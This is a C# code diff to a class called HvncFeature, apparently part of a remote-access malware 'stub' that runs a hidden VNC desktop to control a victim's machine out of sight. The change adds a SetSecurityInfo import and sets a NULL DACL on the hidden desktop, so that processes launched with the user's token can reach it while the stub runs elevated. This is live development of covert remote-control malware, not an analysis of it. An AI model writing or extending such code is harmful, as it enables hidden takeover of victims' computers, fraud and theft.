@@ -140,6 +140,7 @@ internal static class HvncFeature
 
     [DllImport("advapi32.dll")] static extern bool OpenProcessToken(nint hProcess, uint dwAccess, out nint phToken);
     [DllImport("advapi32.dll")] static extern bool DuplicateTokenEx(nint hToken, uint dwAccess, nint lpsa, int impLevel, int tokenType, out nint phNew);
+    [DllImport("advapi32.dll")] static extern uint SetSecurityInfo(nint handle, uint ObjectType, uint SecurityInfo, nint psidOwner, nint psidGroup, nint pDacl, nint pSacl);
     [DllImport("advapi32.dll", CharSet = CharSet.Unicode)]
     static extern bool CreateProcessAsUserW(nint hToken, nint lpApp, System.Text.StringBuilder lpCmd,
         nint pa, nint ta, bool inherit, uint flags, nint lpEnv, nint dir,
@@ -348,6 +349,9 @@ internal static class HvncFeature
         if (_hDesktop == 0)
             _hDesktop = OpenDesktop(DesktopName, 0, false, DESKTOP_ALL);
         if (_hDesktop == 0) { StubLog.Error("[HVNC] Failed to create/open hidden desktop"); return; }
+        // NULL DACL lets medium-IL processes (spawned via CreateProcessAsUserW with user token)
+        // access the desktop when the stub is running elevated. SE_WINDOW_OBJECT=7, DACL_SECURITY_INFORMATION=4.
+        SetSecurityInfo(_hDesktop, 7u, 4u, 0, 0, 0, 0);
         StubLog.Info($"[HVNC] Desktop 0x{_hDesktop:X}, canvas {_canvasW}x{_canvasH}");
 
         EnsureGdiplus();
